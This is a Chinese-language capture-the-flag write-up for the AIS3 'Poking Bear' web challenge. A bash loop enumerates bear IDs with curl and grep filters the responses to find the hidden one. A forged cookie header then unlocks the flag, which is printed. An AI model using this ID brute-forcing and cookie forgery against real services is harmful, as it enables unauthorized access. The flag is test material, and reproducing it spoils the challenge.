# Poking Bear
## 題目

![image](https://user-images.githubusercontent.com/57281249/168678736-f76ecd4f-cf71-4842-9ca6-839b26e546d8.png)

## 解題
網頁內容是你可以選一隻 bear poke，但你要 poke 到 SECRET BEAR 才能拿到 Flag，但是 SECRET BEAR 的 bear id 他是隱藏的，然而第一隻到最後一隻的 id 是 5-999 那就用最原始的方式爆掃一波。

![image](https://user-images.githubusercontent.com/57281249/168678831-361e73c3-1421-4553-95f0-74fad6484303.png)

![image](https://user-images.githubusercontent.com/57281249/168678912-82276a1c-5dcd-452c-9c89-cc289145faa5.png)

![image](https://user-images.githubusercontent.com/57281249/168678942-0dade361-5815-4c8b-868a-db1a90d7d550.png)

``` bash
#!/bin/bash

> /tmp/output

for a in $(seq 1 1 1000)
do
    echo "$a: $(curl -X POST http://chals1.ais3.org:8987/poke -d "bear_id=$a")" >> /tmp/output &
done
```

![image](https://user-images.githubusercontent.com/57281249/168679172-e8275cf9-dde3-4a8c-93ad-d273d5f9edf4.png)

找與眾不同的那個 
``` bash
grep -v "You shouldn't poke a cat!" /tmp/output | grep -v "Poked, but nothing happened!"
```

![image](https://user-images.githubusercontent.com/57281249/168679215-cf3a67b0-3693-4872-a510-faff04ff99b2.png)

他說你不是 `bear poker` 八成要改 cookie。

``` bash
curl -X POST http://chals1.ais3.org:8987/poke --header "cookie: human=\"bear poker\"" -d "bear_id=499"
```

![image](https://user-images.githubusercontent.com/57281249/168679292-88af88d7-6247-4565-a814-babb679dc24c.png)

## Flag
`AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`
